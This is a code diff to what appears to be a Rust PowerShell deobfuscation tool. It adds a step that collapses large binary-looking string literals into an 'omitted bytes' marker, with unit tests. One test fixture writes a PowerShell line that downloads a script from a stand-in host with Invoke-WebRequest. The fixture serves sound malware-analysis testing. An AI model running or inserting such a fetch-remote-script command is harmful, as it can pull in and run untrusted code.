@@ -1992,7 +1992,8 @@ fn decode_payload(bytes: &[u8]) -> std::borrow::Cow<'_, str> {
 pub fn normalize_ps1_text(text: &str) -> String {
     let expanded = strip_marker_noise(&expand_obfuscation(&strip_marker_noise(text)));
     let aliased = crate::ps_alias::expand_aliases_if_ps(&expanded);
-    escape_binary_controls(&aliased)
+    let summarized = summarize_large_binary_ps_literals(&aliased);
+    escape_binary_controls(&summarized)
 }
 
 pub fn normalize_ps1_payload(bytes: &[u8]) -> String {
@@ -2018,6 +2019,74 @@ fn escape_binary_controls(text: &str) -> String {
         }
     }
     out
+}
+
+fn summarize_large_binary_ps_literals(text: &str) -> String {
+    const MIN_LITERAL_BYTES: usize = 4096;
+
+    if !text.contains('\'') {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len().min(256 * 1024));
+    let mut cursor = 0usize;
+    while cursor < text.len() {
+        let Some(open_rel) = text[cursor..].find('\'') else {
+            out.push_str(&text[cursor..]);
+            break;
+        };
+        let open = cursor + open_rel;
+        out.push_str(&text[cursor..=open]);
+
+        let mut idx = open + 1;
+        let mut close = None;
+        while idx < text.len() {
+            let Some(rel) = text[idx..].find('\'') else {
+                break;
+            };
+            let quote = idx + rel;
+            if text[quote + 1..].starts_with('\'') {
+                idx = quote + 2;
+                continue;
+            }
+            close = Some(quote);
+            break;
+        }
+
+        let Some(close) = close else {
+            out.push_str(&text[open + 1..]);
+            break;
+        };
+
+        let literal = &text[open + 1..close];
+        if literal.len() >= MIN_LITERAL_BYTES && is_binary_looking_ps_literal(literal) {
+            out.push_str(&format!(
+                "::==== harrington: omitted {} binary-looking bytes from PowerShell string literal ====",
+                literal.len()
+            ));
+        } else {
+            out.push_str(literal);
+        }
+        out.push('\'');
+        cursor = close + 1;
+    }
+
+    out
+}
+
+fn is_binary_looking_ps_literal(literal: &str) -> bool {
+    let mut suspicious = 0usize;
+    let mut total = 0usize;
+    for c in literal.chars() {
+        total += 1;
+        if c == '\u{fffd}'
+            || (c.is_control() && !matches!(c, '\r' | '\n' | '\t'))
+            || (!c.is_ascii() && !c.is_alphabetic())
+        {
+            suspicious += 1;
+        }
+    }
+    total >= 1024 && suspicious * 100 >= total * 20
 }
 
 pub fn extract_self_embedded_ps1(env: &mut Environment, deobfuscated: &str) {
@@ -2520,6 +2589,46 @@ static OUTER_FROMBASE64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
 #[cfg(test)]
 mod herestring_iex_tests {
     use super::*;
+
+    #[test]
+    fn normalize_summarizes_large_binary_string_literal() {
+        let binary = format!(
+            "{}\u{fffd}{}",
+            "\x01\x02\x03\x04".repeat(1200),
+            "\x05".repeat(1200)
+        );
+        let ps = format!(
+            "$blob = '{binary}'; Invoke-WebRequest -Uri 'https://binary-lit.example/p.ps1'"
+        );
+        let normalized = normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains("omitted") && normalized.contains("PowerShell string literal"),
+            "binary literal was not summarized:\n{}",
+            normalized
+        );
+        assert!(
+            normalized.contains("https://binary-lit.example/p.ps1"),
+            "URL literal should remain visible:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("\\x01\\x02\\x03\\x04\\x01\\x02"),
+            "binary literal was escaped instead of summarized"
+        );
+    }
+
+    #[test]
+    fn normalize_preserves_large_text_string_literal() {
+        let text = "A".repeat(5000);
+        let ps = format!("$blob = '{text}'; Write-Host done");
+        let normalized = normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains(&text) && !normalized.contains("omitted"),
+            "plain text literal should not be summarized"
+        );
+    }
 
     #[test]
     fn joins_backtick_line_continuations() {
